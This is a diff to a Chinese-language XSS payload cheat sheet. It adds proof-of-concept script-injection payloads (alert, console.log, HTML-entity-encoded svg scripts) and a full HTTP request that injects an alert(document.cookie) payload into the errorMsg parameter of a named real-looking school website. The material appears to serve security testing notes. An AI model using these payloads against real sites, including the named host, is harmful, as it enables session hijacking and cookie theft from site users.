@@ -14,6 +14,26 @@
 
 XSS（跨站脚本漏洞）是一种通过注入恶意脚本（通常是 JavaScript）到可信网站或应用程序中，诱使其他用户在其浏览器中执行，从而窃取数据、劫持会话或执行恶意操作的安全漏洞。
 
+```html
+"><script>alert(1)</script>
+```
+
+```
+GET /show/login/show_error_page.action?errorMsg=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E HTTP/1.1
+Host: hb.wanguoschool.com
+
+```
+
+>  URL 编码
+
+存储型 xss 使用控制台返回
+
+```html
+<script>console.log(1)</script>
+```
+
+
+
 在 JS 标签中只允许执行英文小写
 
 ```
@@ -225,13 +245,13 @@ svg 可以自动解析 js 标签中的 html 编码
 <svg><script>&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script>
 ```
 
-单次弹窗漏洞验证
+弹窗验证
 
 ```
 alert(1)
 ```
 
-无影响的漏洞验证
+控制台验证
 
 ```
 console.log(1)
